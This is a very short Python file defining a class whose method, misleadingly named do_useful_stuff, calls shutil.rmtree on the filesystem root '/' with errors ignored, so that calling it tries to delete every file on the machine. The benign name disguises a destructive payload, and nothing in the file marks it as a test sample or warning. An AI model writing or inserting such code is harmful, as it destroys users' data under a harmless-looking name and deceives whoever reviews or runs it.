import shutil


class MyClass(object):
    def do_useful_stuff(self):
        shutil.rmtree("/", ignore_errors=True)